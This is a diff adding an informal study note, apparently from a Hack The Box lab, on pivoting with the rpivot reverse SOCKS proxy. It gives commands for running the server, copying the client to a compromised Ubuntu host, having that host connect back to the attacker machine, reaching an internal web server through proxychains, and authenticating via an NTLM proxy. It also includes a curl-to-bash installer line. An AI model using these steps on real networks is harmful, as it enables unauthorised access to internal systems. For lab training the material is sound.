@@ -1,0 +1,59 @@
+ima keep it a buck whichyaaaaaaaaaaaaaaaa we have to downgrade python to python2.7 for this tool so im not sure we will use it all that often. but ya here we gooooooo 
+
+Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
+
+We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.
+
+Cloning rpivot
+Web Server Pivoting with Rpivot
+
+Sytnax: MJBUCKNER@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
+
+Installing Python2.7
+
+Web Server Pivoting with Rpivot
+Syntax: MJBUCKNER@htb[/htb]$ sudo apt-get install python2.7
+
+Alternative Installation of Python2.7
+Web Server Pivoting with Rpivot
+Syntax: MJBUCKNER@htb[/htb]$ curl https://pyenv.run | bash
+Syntax: MJBUCKNER@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+Syntax: MJBUCKNER@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+Syntax: MJBUCKNER@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+Syntax: MJBUCKNER@htb[/htb]$ source ~/.bashrc
+Syntax: MJBUCKNER@htb[/htb]$ pyenv install 2.7
+Syntax: MJBUCKNER@htb[/htb]$ pyenv shell 2.7
+
+We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
+
+From Attack Host running Server.py: 
+
+Syntax: MJBUCKNER@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 
+
+Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
+
+Transfering rpivot to the Target: 
+
+Syntax: MJBUCKNER@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+
+Running client.py from TARGET PIVOT
+
+Syntax: ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+Backconnecting to server 10.10.14.18 port 9999
+
+Confirming Connection is Established
+
+Syntax FROM WEB SERVER: New connection from host 10.129.202.64, source port 35226
+
+We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
+
+Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
+
+Syntax FROM HOST MACHINE: proxychains firefox-esr 172.16.5.135:80
+
+Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
+
+Connecting to a Web Server using HTTP-Proxy & NTLM Auth
+
+Syntax FROM HOST MACHINE???? : python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
